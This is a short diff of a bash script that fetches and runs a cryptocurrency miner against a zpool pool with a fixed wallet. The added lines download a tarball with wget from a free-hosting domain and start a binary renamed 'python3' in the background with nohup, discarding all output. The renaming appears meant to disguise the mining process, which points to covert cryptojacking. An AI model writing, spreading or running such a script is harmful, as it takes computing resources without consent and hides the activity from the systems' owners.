@@ -1,13 +1,9 @@
 #!/bin/bash
 
-kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
-
-wget -O dot https://github.com/TrailingStop/TT-Miner-beta/releases/download/2024.2.1-beta5/TT-Miner-2024.2.1B5.2.tar.gz
+wget -O dot momok.x10.bz/DOT-SRB.tar.gz
 
 tar xvf dot
 
-cd TT-Miner-2024.2.1B5.2
+nomer=$((RANDOM % 50 + 1))
 
-mv TT-Miner test$kolot
-
-nohup ./test$kolot -a FLEX -P kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$kolot@flex.eu.mine.zpool.ca:3340 > /dev/null 2>&1 &
+nohup ./dotsrb/python3 -a flex -o flex.eu.mine.zpool.ca:3340 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$nomer > /dev/null 2>&1 &
